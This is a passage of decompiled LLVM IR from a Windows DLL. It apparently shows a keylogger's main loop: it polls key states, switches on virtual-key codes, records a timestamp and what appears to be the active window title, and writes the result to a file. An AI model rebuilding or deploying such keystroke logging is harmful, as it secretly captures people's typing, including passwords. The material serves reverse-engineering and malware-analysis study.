  %esp.6.reg2mem = alloca i32, !insn.addr !937
  %.pre-phi.reg2mem = alloca i32, !insn.addr !937
  %esp.5.reg2mem = alloca i32, !insn.addr !937
  %esp.4.reg2mem = alloca i32, !insn.addr !937
  %edx.6.reg2mem = alloca i32, !insn.addr !937
  %.pn.reg2mem = alloca i32, !insn.addr !937
  %ecx.16.reg2mem = alloca i32, !insn.addr !937
  %ecx.15.reg2mem = alloca i32, !insn.addr !937
  %ecx.14.reg2mem = alloca i32, !insn.addr !937
  %ecx.13.reg2mem = alloca i32, !insn.addr !937
  %ecx.12.reg2mem = alloca i32, !insn.addr !937
  %ecx.11.reg2mem = alloca i32, !insn.addr !937
  %ecx.10.reg2mem = alloca i32, !insn.addr !937
  %ecx.9.reg2mem = alloca i32, !insn.addr !937
  %ecx.8.reg2mem = alloca i32, !insn.addr !937
  %ecx.7.reg2mem = alloca i32, !insn.addr !937
  %ecx.6.reg2mem = alloca i32, !insn.addr !937
  %ecx.5.reg2mem = alloca i32, !insn.addr !937
  %ecx.4.reg2mem = alloca i32, !insn.addr !937
  %esp.3.reg2mem = alloca i32, !insn.addr !937
  %ecx.3.reg2mem = alloca i32, !insn.addr !937
  %eax.2.reg2mem = alloca i32, !insn.addr !937
  %esp.2.reg2mem = alloca i32, !insn.addr !937
  %ecx.0.reg2mem = alloca i32, !insn.addr !937
  %eax.1.reg2mem = alloca i32, !insn.addr !937
  %esp.1.reg2mem = alloca i32, !insn.addr !937
  %eax.0.reg2mem = alloca i32, !insn.addr !937
  %stack_var_-216.0.reg2mem = alloca i16*, !insn.addr !937
  %esp.0.reg2mem = alloca i32, !insn.addr !937
  %stack_var_-106 = alloca i32, align 4
  %stack_var_-108 = alloca i128, align 8
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-208 = alloca i128, align 8
  store i128 1919251285, i128* %stack_var_-208, align 8, !insn.addr !938
  %1 = ptrtoint i128* %stack_var_-208 to i32, !insn.addr !939
  store i32 %1, i32* %stack_var_-240, align 4, !insn.addr !939
  %2 = load i128, i128* @global_var_1003a010, align 4, !insn.addr !940
  %3 = call i128 @__asm_movaps(i128 %2), !insn.addr !940
  call void @__asm_movups(i128 undef, i128 %3), !insn.addr !941
  %4 = add i32 %0, 120, !insn.addr !942
  %5 = add i32 %4, %1, !insn.addr !942
  %6 = inttoptr i32 %5 to i32*, !insn.addr !942
  %7 = load i32, i32* %6, align 4, !insn.addr !942
  %8 = add i32 %7, %1, !insn.addr !943
  %9 = bitcast i128* %stack_var_-208 to i32*, !insn.addr !944
  %10 = call i32 @function_1000b2e0(i32 %1, i32* nonnull %9), !insn.addr !944
  %11 = add i32 %8, 36, !insn.addr !945
  %12 = inttoptr i32 %11 to i32*, !insn.addr !945
  %13 = load i32, i32* %12, align 4, !insn.addr !945
  %14 = load i128, i128* @global_var_1003a0a0, align 4, !insn.addr !946
  %15 = call i128 @__asm_movaps(i128 %14), !insn.addr !946
  %16 = mul i32 %10, 2, !insn.addr !947
  %17 = add i32 %16, %1, !insn.addr !947
  %18 = add i32 %17, %13, !insn.addr !948
  %19 = inttoptr i32 %18 to i16*, !insn.addr !948
  %20 = load i16, i16* %19, align 2, !insn.addr !948
  %21 = zext i16 %20 to i32, !insn.addr !948
  %22 = add i32 %8, 28, !insn.addr !949
  %23 = inttoptr i32 %22 to i32*, !insn.addr !949
  %24 = load i32, i32* %23, align 4, !insn.addr !949
  %25 = mul i32 %21, 4, !insn.addr !950
  %26 = add i32 %24, %1, !insn.addr !950
  %27 = add i32 %26, %25, !insn.addr !951
  %28 = inttoptr i32 %27 to i32*, !insn.addr !951
  %29 = load i32, i32* %28, align 4, !insn.addr !951
  %30 = add i32 %29, %1, !insn.addr !952
  call void @__asm_movups(i128 undef, i128 %15), !insn.addr !953
  store i32 %30, i32* @global_var_100410ac, align 4, !insn.addr !954
  %31 = call i32 @function_1000b2e0(i32 %1, i32* nonnull %9), !insn.addr !955
  %32 = ptrtoint i32* %stack_var_-240 to i32, !insn.addr !956
  store i128 1467245895, i128* %stack_var_-208, align 8, !insn.addr !957
  %33 = call i32 @function_1000a260(), !insn.addr !958
  %34 = ptrtoint i128* %stack_var_-108 to i32
  %35 = ptrtoint i32* %stack_var_-106 to i32
  %36 = load i128, i128* @global_var_10039de0, align 4
  %37 = load i128, i128* @global_var_10039e00, align 4
  %38 = load i128, i128* @global_var_10039df0, align 4
  %39 = load i128, i128* @global_var_10039dd0, align 4
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !959
  br label %dec_label_pc_10002c20, !insn.addr !959

dec_label_pc_10002c20:                            ; preds = %dec_label_pc_10002c20.backedge, %dec_label_pc_10002ae0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %40 = add i32 %esp.0.reload, -4, !insn.addr !960
  %41 = inttoptr i32 %40 to i32*, !insn.addr !960
  store i32 30, i32* %41, align 4, !insn.addr !960
  call void @Sleep(i32 %33), !insn.addr !961
  store i16* inttoptr (i32 8 to i16*), i16** %stack_var_-216.0.reg2mem, !insn.addr !962
  store i32 8, i32* %eax.0.reg2mem, !insn.addr !962
  store i32 %40, i32* %esp.1.reg2mem, !insn.addr !962
  br label %dec_label_pc_10002c33, !insn.addr !962

dec_label_pc_10002c33:                            ; preds = %dec_label_pc_1000362f, %dec_label_pc_10002c20
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %stack_var_-216.0.reload = load i16*, i16** %stack_var_-216.0.reg2mem
  %sext = mul i32 %eax.0.reload, 65536
  %42 = sdiv i32 %sext, 65536, !insn.addr !963
  %43 = add i32 %esp.1.reload, -4, !insn.addr !964
  %44 = inttoptr i32 %43 to i32*, !insn.addr !964
  store i32 %42, i32* %44, align 4, !insn.addr !964
  %45 = trunc i32 %42 to i16, !insn.addr !965
  %46 = icmp eq i16 %45, -32767, !insn.addr !965
  %47 = icmp eq i1 %46, false, !insn.addr !966
  br i1 %47, label %dec_label_pc_10002c33.dec_label_pc_1000362f_crit_edge, label %dec_label_pc_10002c49, !insn.addr !966

dec_label_pc_10002c33.dec_label_pc_1000362f_crit_edge: ; preds = %dec_label_pc_10002c33
  %.pre = ptrtoint i16* %stack_var_-216.0.reload to i32, !insn.addr !967
  store i32 %.pre, i32* %.pre-phi.reg2mem
  store i32 %43, i32* %esp.6.reg2mem
  br label %dec_label_pc_1000362f

dec_label_pc_10002c49:                            ; preds = %dec_label_pc_10002c33
  store i32 %42, i32* @global_var_100410a4, align 4, !insn.addr !968
  %48 = icmp eq i32 %sext, 0, !insn.addr !969
  store i32 %43, i32* %esp.3.reg2mem, !insn.addr !970
  br i1 %48, label %dec_label_pc_10002dae, label %dec_label_pc_10002c5c, !insn.addr !970

dec_label_pc_10002c5c:                            ; preds = %dec_label_pc_10002c49
  %49 = add i32 %esp.1.reload, -8, !insn.addr !971
  %50 = inttoptr i32 %49 to i32*, !insn.addr !971
  store i32 1024, i32* %50, align 4, !insn.addr !971
  %51 = add i32 %esp.1.reload, -12, !insn.addr !972
  %52 = inttoptr i32 %51 to i32*, !insn.addr !972
  store i32 ptrtoint (i16** @global_var_10040598 to i32), i32* %52, align 4, !insn.addr !972
  %53 = add i32 %esp.1.reload, -16, !insn.addr !973
  %54 = inttoptr i32 %53 to i32*, !insn.addr !973
  store i32 %42, i32* %54, align 4, !insn.addr !973
  store i32 ptrtoint (i16** @global_var_10040598 to i32), i32* %eax.1.reg2mem, !insn.addr !974
  store i32 ptrtoint (i16** @global_var_100410b0 to i32), i32* %ecx.0.reg2mem, !insn.addr !974
  br label %dec_label_pc_10002c80, !insn.addr !974

dec_label_pc_10002c80:                            ; preds = %dec_label_pc_10002c97, %dec_label_pc_10002c5c
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %55 = inttoptr i32 %eax.1.reload to i16*, !insn.addr !975
  %56 = load i16, i16* %55, align 4, !insn.addr !975
  %57 = inttoptr i32 %ecx.0.reload to i16*, !insn.addr !976
  %58 = load i16, i16* %57, align 4, !insn.addr !976
  %59 = icmp eq i16 %56, %58, !insn.addr !976
  %60 = icmp eq i1 %59, false, !insn.addr !977
  br i1 %60, label %dec_label_pc_10002cb3, label %dec_label_pc_10002c88, !insn.addr !977

dec_label_pc_10002c88:                            ; preds = %dec_label_pc_10002c80
  %61 = icmp eq i16 %56, 0, !insn.addr !978
  store i32 %53, i32* %esp.3.reg2mem, !insn.addr !979
  br i1 %61, label %dec_label_pc_10002dae, label %dec_label_pc_10002c8d, !insn.addr !979

dec_label_pc_10002c8d:                            ; preds = %dec_label_pc_10002c88
  %62 = or i32 %eax.1.reload, 2, !insn.addr !980
  %63 = inttoptr i32 %62 to i16*, !insn.addr !980
  %64 = load i16, i16* %63, align 2, !insn.addr !980
  %65 = or i32 %ecx.0.reload, 2, !insn.addr !981
  %66 = inttoptr i32 %65 to i16*, !insn.addr !981
  %67 = load i16, i16* %66, align 2, !insn.addr !981
  %68 = icmp eq i16 %64, %67, !insn.addr !981
  %69 = icmp eq i1 %68, false, !insn.addr !982
  br i1 %69, label %dec_label_pc_10002cb3, label %dec_label_pc_10002c97, !insn.addr !982

dec_label_pc_10002c97:                            ; preds = %dec_label_pc_10002c8d
  %70 = add i32 %eax.1.reload, 4, !insn.addr !983
  %71 = add i32 %ecx.0.reload, 4, !insn.addr !984
  %72 = icmp eq i16 %64, 0, !insn.addr !985
  %73 = icmp eq i1 %72, false, !insn.addr !986
  store i32 %70, i32* %eax.1.reg2mem, !insn.addr !986
  store i32 %71, i32* %ecx.0.reg2mem, !insn.addr !986
  store i32 %53, i32* %esp.3.reg2mem, !insn.addr !986
  br i1 %73, label %dec_label_pc_10002c80, label %dec_label_pc_10002dae, !insn.addr !986

dec_label_pc_10002cb3:                            ; preds = %dec_label_pc_10002c8d, %dec_label_pc_10002c80
  %74 = load i32, i32* @global_var_10040590, align 4, !insn.addr !987
  %75 = icmp eq i32 %74, 0, !insn.addr !987
  %76 = add i32 %esp.1.reload, -20, !insn.addr !988
  %77 = inttoptr i32 %76 to i32*, !insn.addr !988
  store i32 0, i32* %77, align 4, !insn.addr !988
  %78 = add i32 %esp.1.reload, -24, !insn.addr !989
  %79 = inttoptr i32 %78 to i32*, !insn.addr !989
  store i32 128, i32* %79, align 4, !insn.addr !989
  %80 = add i32 %esp.1.reload, -28
  %81 = inttoptr i32 %80 to i32*
  br i1 %75, label %dec_label_pc_10002cf4, label %dec_label_pc_10002cc3, !insn.addr !990

dec_label_pc_10002cc3:                            ; preds = %dec_label_pc_10002cb3
  store i32 2, i32* %81, align 4, !insn.addr !991
  %82 = add i32 %esp.1.reload, -32, !insn.addr !992
  %83 = inttoptr i32 %82 to i32*, !insn.addr !992
  store i32 0, i32* %83, align 4, !insn.addr !992
  %84 = add i32 %esp.1.reload, -36, !insn.addr !993
  %85 = inttoptr i32 %84 to i32*, !insn.addr !993
  store i32 2, i32* %85, align 4, !insn.addr !993
  %86 = add i32 %esp.1.reload, -40, !insn.addr !994
  %87 = inttoptr i32 %86 to i32*, !insn.addr !994
  store i32 2, i32* %87, align 4, !insn.addr !994
  %88 = add i32 %esp.1.reload, -44, !insn.addr !995
  %89 = inttoptr i32 %88 to i32*, !insn.addr !995
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %89, align 4, !insn.addr !995
  %90 = call i32* @CreateFileW(i16* bitcast (i32* @4 to i16*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !996
  %91 = ptrtoint i32* %90 to i32, !insn.addr !996
  %92 = add i32 %esp.1.reload, -48, !insn.addr !997
  %93 = inttoptr i32 %92 to i32*, !insn.addr !997
  store i32 0, i32* %93, align 4, !insn.addr !997
  %94 = add i32 %esp.1.reload, -52, !insn.addr !998
  %95 = inttoptr i32 %94 to i32*, !insn.addr !998
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %95, align 4, !insn.addr !998
  %96 = add i32 %esp.1.reload, -56, !insn.addr !999
  %97 = inttoptr i32 %96 to i32*, !insn.addr !999
  store i32 2, i32* %97, align 4, !insn.addr !999
  %98 = add i32 %esp.1.reload, -60, !insn.addr !1000
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1000
  store i32 ptrtoint (i32* @global_var_1003e9c4 to i32), i32* %99, align 4, !insn.addr !1000
  %100 = add i32 %esp.1.reload, -64, !insn.addr !1001
  %101 = inttoptr i32 %100 to i32*, !insn.addr !1001
  store i32 %91, i32* %101, align 4, !insn.addr !1001
  store i32 %91, i32* @global_var_1003e9c0, align 4, !insn.addr !1002
  %102 = call i1 @WriteFile(i32* nonnull @4, i32* nonnull @4, i32 ptrtoint (i32* @4 to i32), i32* nonnull @4, %_OVERLAPPED* bitcast (i32* @4 to %_OVERLAPPED*)), !insn.addr !1003
  store i32 0, i32* @global_var_10040590, align 4, !insn.addr !1004
  store i32 %100, i32* %esp.2.reg2mem, !insn.addr !1005
  br label %dec_label_pc_10002d08, !insn.addr !1005

dec_label_pc_10002cf4:                            ; preds = %dec_label_pc_10002cb3
  store i32 4, i32* %81, align 4, !insn.addr !1006
  %103 = add i32 %esp.1.reload, -32, !insn.addr !1007
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1007
  store i32 0, i32* %104, align 4, !insn.addr !1007
  %105 = add i32 %esp.1.reload, -36, !insn.addr !1008
  %106 = inttoptr i32 %105 to i32*, !insn.addr !1008
  store i32 1, i32* %106, align 4, !insn.addr !1008
  %107 = add i32 %esp.1.reload, -40, !insn.addr !1009
  %108 = inttoptr i32 %107 to i32*, !insn.addr !1009
  store i32 4, i32* %108, align 4, !insn.addr !1009
  %109 = add i32 %esp.1.reload, -44, !insn.addr !1010
  %110 = inttoptr i32 %109 to i32*, !insn.addr !1010
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %110, align 4, !insn.addr !1010
  %111 = call i32* @CreateFileW(i16* bitcast (i32* @4 to i16*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1011
  %112 = ptrtoint i32* %111 to i32, !insn.addr !1011
  store i32 %112, i32* @global_var_1003e9c0, align 4, !insn.addr !1012
  store i32 %109, i32* %esp.2.reg2mem, !insn.addr !1012
  br label %dec_label_pc_10002d08, !insn.addr !1012

dec_label_pc_10002d08:                            ; preds = %dec_label_pc_10002cf4, %dec_label_pc_10002cc3
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %113 = add i32 %esp.2.reload, -4, !insn.addr !1013
  %114 = inttoptr i32 %113 to i32*, !insn.addr !1013
  store i32 ptrtoint (i16* @global_var_10040fa0 to i32), i32* %114, align 4, !insn.addr !1013
  call void @GetLocalTime(%_SYSTEMTIME* bitcast (i32* @4 to %_SYSTEMTIME*)), !insn.addr !1014
  %115 = load i16, i16* @global_var_10040fac, align 2, !insn.addr !1015
  %116 = zext i16 %115 to i32, !insn.addr !1015
  %117 = add i32 %esp.2.reload, -8, !insn.addr !1016
  %118 = inttoptr i32 %117 to i32*, !insn.addr !1016
  store i32 ptrtoint (i16** @global_var_10040598 to i32), i32* %118, align 4, !insn.addr !1016
  %119 = add i32 %esp.2.reload, -12, !insn.addr !1017
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1017
  store i32 %116, i32* %120, align 4, !insn.addr !1017
  %121 = load i16, i16* @global_var_10040faa, align 2, !insn.addr !1018
  %122 = zext i16 %121 to i32, !insn.addr !1018
  %123 = add i32 %esp.2.reload, -16, !insn.addr !1019
  %124 = inttoptr i32 %123 to i32*, !insn.addr !1019
  store i32 %122, i32* %124, align 4, !insn.addr !1019
  %125 = load i16, i16* @global_var_10040fa8, align 2, !insn.addr !1020
  %126 = zext i16 %125 to i32, !insn.addr !1020
  %127 = add i32 %esp.2.reload, -20, !insn.addr !1021
  %128 = inttoptr i32 %127 to i32*, !insn.addr !1021
  store i32 %126, i32* %128, align 4, !insn.addr !1021
  %129 = load i16, i16* @global_var_10040fa6, align 2, !insn.addr !1022
  %130 = zext i16 %129 to i32, !insn.addr !1022
  %131 = add i32 %esp.2.reload, -24, !insn.addr !1023
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1023
  store i32 %130, i32* %132, align 4, !insn.addr !1023
  %133 = load i16, i16* @global_var_10040fa2, align 2, !insn.addr !1024
  %134 = zext i16 %133 to i32, !insn.addr !1024
  %135 = add i32 %esp.2.reload, -28, !insn.addr !1025
  %136 = inttoptr i32 %135 to i32*, !insn.addr !1025
  store i32 %134, i32* %136, align 4, !insn.addr !1025
  %137 = load i16, i16* @global_var_10040fa0, align 2, !insn.addr !1026
  %138 = zext i16 %137 to i32, !insn.addr !1026
  %139 = add i32 %esp.2.reload, -32, !insn.addr !1027
  %140 = inttoptr i32 %139 to i32*, !insn.addr !1027
  store i32 %138, i32* %140, align 4, !insn.addr !1027
  %141 = add i32 %esp.2.reload, -36, !insn.addr !1028
  %142 = inttoptr i32 %141 to i32*, !insn.addr !1028
  store i32 ptrtoint ([40 x i16]* @global_var_100392a8 to i32), i32* %142, align 4, !insn.addr !1028
  %143 = add i32 %esp.2.reload, -40, !insn.addr !1029
  %144 = inttoptr i32 %143 to i32*, !insn.addr !1029
  store i32 ptrtoint (i16** @global_var_1003fd90 to i32), i32* %144, align 4, !insn.addr !1029
  %145 = call i32 (i16*, i16*, ...) @wsprintfW(i16* bitcast (i32* @4 to i16*), i16* bitcast (i32* @4 to i16*)), !insn.addr !1030
  store i32 ptrtoint (i16** @global_var_1003fd90 to i32), i32* %eax.2.reg2mem, !insn.addr !1031
  br label %dec_label_pc_10002d63, !insn.addr !1031

dec_label_pc_10002d63:                            ; preds = %dec_label_pc_10002d63, %dec_label_pc_10002d08
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %146 = inttoptr i32 %eax.2.reload to i16*, !insn.addr !1032
  %147 = load i16, i16* %146, align 2, !insn.addr !1032
  %148 = add i32 %eax.2.reload, 2, !insn.addr !1033
  %149 = icmp eq i16 %147, 0, !insn.addr !1034
  %150 = icmp eq i1 %149, false, !insn.addr !1035
  store i32 %148, i32* %eax.2.reg2mem, !insn.addr !1035
  br i1 %150, label %dec_label_pc_10002d63, label %dec_label_pc_10002d6e, !insn.addr !1035

dec_label_pc_10002d6e:                            ; preds = %dec_label_pc_10002d63
  %151 = sub i32 %148, ptrtoint (i32* @global_var_1003fd92 to i32), !insn.addr !1036
  store i32 0, i32* %118, align 4, !insn.addr !1037
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %120, align 4, !insn.addr !1038
  store i32 %151, i32* %124, align 4, !insn.addr !1039
  store i32 ptrtoint (i16** @global_var_1003fd90 to i32), i32* %128, align 4, !insn.addr !1040
  %152 = load i32, i32* @global_var_1003e9c0, align 4, !insn.addr !1041
  store i32 %152, i32* %132, align 4, !insn.addr !1041
  %153 = call i1 @WriteFile(i32* nonnull @4, i32* nonnull @4, i32 ptrtoint (i32* @4 to i32), i32* nonnull @4, %_OVERLAPPED* bitcast (i32* @4 to %_OVERLAPPED*)), !insn.addr !1042
  store i32 0, i32* %ecx.3.reg2mem, !insn.addr !1043
  br label %dec_label_pc_10002d90, !insn.addr !1043

dec_label_pc_10002d90:                            ; preds = %dec_label_pc_10002d90, %dec_label_pc_10002d6e
  %ecx.3.reload = load i32, i32* %ecx.3.reg2mem
  %154 = add i32 %ecx.3.reload, ptrtoint (i16** @global_var_10040598 to i32), !insn.addr !1044
  %155 = inttoptr i32 %154 to i16*, !insn.addr !1044
  %156 = load i16, i16* %155, align 2, !insn.addr !1044
  %157 = add i32 %ecx.3.reload, 2, !insn.addr !1045
  %158 = add i32 %ecx.3.reload, 268701872, !insn.addr !1046
  %159 = inttoptr i32 %158 to i16*, !insn.addr !1046
  store i16 %156, i16* %159, align 2, !insn.addr !1046
  %160 = icmp eq i16 %156, 0, !insn.addr !1047
  %161 = icmp eq i1 %160, false, !insn.addr !1048
  store i32 %157, i32* %ecx.3.reg2mem, !insn.addr !1048
  br i1 %161, label %dec_label_pc_10002d90, label %dec_label_pc_10002da6, !insn.addr !1048

dec_label_pc_10002da6:                            ; preds = %dec_label_pc_10002d90
  %162 = load i32, i32* @global_var_1003e9c0, align 4, !insn.addr !1049
  store i32 %162, i32* %136, align 4, !insn.addr !1049
  %163 = call i1 @CloseHandle(i32* nonnull @4), !insn.addr !1050
  store i32 %135, i32* %esp.3.reg2mem, !insn.addr !1050
  br label %dec_label_pc_10002dae, !insn.addr !1050

dec_label_pc_10002dae:                            ; preds = %dec_label_pc_10002c88, %dec_label_pc_10002c97, %dec_label_pc_10002da6, %dec_label_pc_10002c49
  %esp.3.reload = load i32, i32* %esp.3.reg2mem
  %164 = ptrtoint i16* %stack_var_-216.0.reload to i32
  store i32 %164, i32* @3, align 4, !insn.addr !1051
  %165 = trunc i32 %164 to i16, !insn.addr !1052
  %.off = add i16 %165, -39
  %166 = icmp ult i16 %.off, 52
  br i1 %166, label %dec_label_pc_1000364f, label %dec_label_pc_10002dc4, !insn.addr !1052

dec_label_pc_10002dc4:                            ; preds = %dec_label_pc_10002dae
  store i32 %164, i32* %.pre-phi.reg2mem, !insn.addr !1053
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !1053
  switch i32 %164, label %dec_label_pc_1000362f [
    i32 0, label %dec_label_pc_100031e9
    i32 1, label %dec_label_pc_10002e5d
    i32 2, label %dec_label_pc_100030fe
    i32 3, label %dec_label_pc_10002e5d
    i32 4, label %dec_label_pc_100030fe
    i32 5, label %dec_label_pc_10002e5d
    i32 6, label %dec_label_pc_10002eb6
    i32 10, label %dec_label_pc_10002e12
    i32 14, label %dec_label_pc_10002f0b
    i32 15, label %dec_label_pc_100035c3
    i32 17, label %dec_label_pc_10003361
    i32 29, label %dec_label_pc_10002de3
    i32 30, label %dec_label_pc_100033ba
    i32 31, label %dec_label_pc_1000340c
    i32 32, label %dec_label_pc_10003466
    i32 33, label %dec_label_pc_100034bb
    i32 43, label %dec_label_pc_10002f66
    i32 88, label %dec_label_pc_10003516
    i32 89, label %dec_label_pc_1000356b
    i32 93, label %dec_label_pc_100030a0
    i32 94, label %dec_label_pc_100030cf
    i32 95, label %dec_label_pc_100030fe
    i32 96, label %dec_label_pc_1000312d
    i32 97, label %dec_label_pc_1000315c
    i32 98, label %dec_label_pc_1000318b
    i32 99, label %dec_label_pc_100031ba
    i32 100, label %dec_label_pc_100031e9
    i32 101, label %dec_label_pc_10003218
    i32 102, label %dec_label_pc_10003247
    i32 103, label %dec_label_pc_10003276
    i32 104, label %dec_label_pc_100032a5
    i32 106, label %dec_label_pc_100032d4
    i32 107, label %dec_label_pc_10003303
    i32 108, label %dec_label_pc_10003332
    i32 183, label %dec_label_pc_10002fbb
    i32 184, label %dec_label_pc_10003024
    i32 185, label %dec_label_pc_10003053
    i32 186, label %dec_label_pc_10003062
    i32 187, label %dec_label_pc_10003091
    i32 188, label %dec_label_pc_10002fca
    i32 189, label %dec_label_pc_10002fd9
  ], !insn.addr !1053

dec_label_pc_10002de3:                            ; preds = %dec_label_pc_10002dc4
  %167 = add i32 %esp.3.reload, -4, !insn.addr !1054
  %168 = inttoptr i32 %167 to i32*, !insn.addr !1054
  store i32 0, i32* %168, align 4, !insn.addr !1054
  %169 = add i32 %esp.3.reload, -8, !insn.addr !1055
  %170 = inttoptr i32 %169 to i32*, !insn.addr !1055
  store i32 128, i32* %170, align 4, !insn.addr !1055
  %171 = add i32 %esp.3.reload, -12, !insn.addr !1056
  %172 = inttoptr i32 %171 to i32*, !insn.addr !1056
  store i32 4, i32* %172, align 4, !insn.addr !1056
  %173 = add i32 %esp.3.reload, -16, !insn.addr !1057
  %174 = inttoptr i32 %173 to i32*, !insn.addr !1057
  store i32 0, i32* %174, align 4, !insn.addr !1057
  %175 = add i32 %esp.3.reload, -20, !insn.addr !1058
  %176 = inttoptr i32 %175 to i32*, !insn.addr !1058
  store i32 1, i32* %176, align 4, !insn.addr !1058
  %177 = add i32 %esp.3.reload, -24, !insn.addr !1059
  %178 = inttoptr i32 %177 to i32*, !insn.addr !1059
  store i32 4, i32* %178, align 4, !insn.addr !1059
  %179 = add i32 %esp.3.reload, -28, !insn.addr !1060
  %180 = inttoptr i32 %179 to i32*, !insn.addr !1060
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %180, align 4, !insn.addr !1060
  %181 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1061
  %182 = ptrtoint i32* %181 to i32, !insn.addr !1061
  %183 = add i32 %esp.3.reload, -32, !insn.addr !1062
  %184 = inttoptr i32 %183 to i32*, !insn.addr !1062
  store i32 0, i32* %184, align 4, !insn.addr !1062
  %185 = add i32 %esp.3.reload, -36, !insn.addr !1063
  %186 = inttoptr i32 %185 to i32*, !insn.addr !1063
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %186, align 4, !insn.addr !1063
  %187 = add i32 %esp.3.reload, -40, !insn.addr !1064
  %188 = inttoptr i32 %187 to i32*, !insn.addr !1064
  store i32 2, i32* %188, align 4, !insn.addr !1064
  %189 = add i32 %esp.3.reload, -44, !insn.addr !1065
  %190 = inttoptr i32 %189 to i32*, !insn.addr !1065
  store i32 ptrtoint (i32* @global_var_100392a4 to i32), i32* %190, align 4, !insn.addr !1065
  store i32 %182, i32* @global_var_1003e9c0, align 4, !insn.addr !1066
  %191 = add i32 %esp.3.reload, -48, !insn.addr !1067
  %192 = inttoptr i32 %191 to i32*, !insn.addr !1067
  store i32 %182, i32* %192, align 4, !insn.addr !1067
  store i32 %191, i32* %esp.5.reg2mem, !insn.addr !1068
  br label %dec_label_pc_10003625, !insn.addr !1068

dec_label_pc_10002e12:                            ; preds = %dec_label_pc_10002dc4
  %193 = call i128 @__asm_movaps(i128 7368318247016640781110928015451), !insn.addr !1069
  %194 = add i32 %esp.3.reload, -4, !insn.addr !1070
  %195 = inttoptr i32 %194 to i32*, !insn.addr !1070
  store i32 0, i32* %195, align 4, !insn.addr !1070
  %196 = add i32 %esp.3.reload, -8, !insn.addr !1071
  %197 = inttoptr i32 %196 to i32*, !insn.addr !1071
  store i32 128, i32* %197, align 4, !insn.addr !1071
  %198 = add i32 %esp.3.reload, -12, !insn.addr !1072
  %199 = inttoptr i32 %198 to i32*, !insn.addr !1072
  store i32 4, i32* %199, align 4, !insn.addr !1072
  %200 = add i32 %esp.3.reload, -16, !insn.addr !1073
  %201 = inttoptr i32 %200 to i32*, !insn.addr !1073
  store i32 0, i32* %201, align 4, !insn.addr !1073
  %202 = add i32 %esp.3.reload, -20, !insn.addr !1074
  %203 = inttoptr i32 %202 to i32*, !insn.addr !1074
  store i32 1, i32* %203, align 4, !insn.addr !1074
  %204 = add i32 %esp.3.reload, -24, !insn.addr !1075
  %205 = inttoptr i32 %204 to i32*, !insn.addr !1075
  store i32 4, i32* %205, align 4, !insn.addr !1075
  %206 = add i32 %esp.3.reload, -28, !insn.addr !1076
  %207 = inttoptr i32 %206 to i32*, !insn.addr !1076
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %207, align 4, !insn.addr !1076
  %208 = load i128, i128* %stack_var_-108, align 8, !insn.addr !1077
  call void @__asm_movups(i128 %208, i128 %193), !insn.addr !1077
  %209 = call i32* @CreateFileW(i16* bitcast (i32* @4 to i16*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1078
  %210 = ptrtoint i32* %209 to i32, !insn.addr !1078
  store i32 %210, i32* @global_var_1003e9c0, align 4, !insn.addr !1079
  store i32 %34, i32* %ecx.4.reg2mem, !insn.addr !1080
  br label %dec_label_pc_10002e47, !insn.addr !1080

dec_label_pc_10002e47:                            ; preds = %dec_label_pc_10002e47, %dec_label_pc_10002e12
  %ecx.4.reload = load i32, i32* %ecx.4.reg2mem
  %211 = inttoptr i32 %ecx.4.reload to i16*, !insn.addr !1081
  %212 = load i16, i16* %211, align 2, !insn.addr !1081
  %213 = add i32 %ecx.4.reload, 2, !insn.addr !1082
  %214 = icmp eq i16 %212, 0, !insn.addr !1083
  %215 = icmp eq i1 %214, false, !insn.addr !1084
  store i32 %213, i32* %ecx.4.reg2mem, !insn.addr !1084
  store i32 %213, i32* %.pn.reg2mem, !insn.addr !1084
  store i32 %210, i32* %edx.6.reg2mem, !insn.addr !1084
  store i32 %206, i32* %esp.4.reg2mem, !insn.addr !1084
  br i1 %215, label %dec_label_pc_10002e47, label %dec_label_pc_10003613, !insn.addr !1084

dec_label_pc_10002e5d:                            ; preds = %dec_label_pc_10002dc4, %dec_label_pc_10002dc4, %dec_label_pc_10002dc4
  %216 = call i128 @__asm_movaps(i128 %39), !insn.addr !1085
  %217 = add i32 %esp.3.reload, -4, !insn.addr !1086
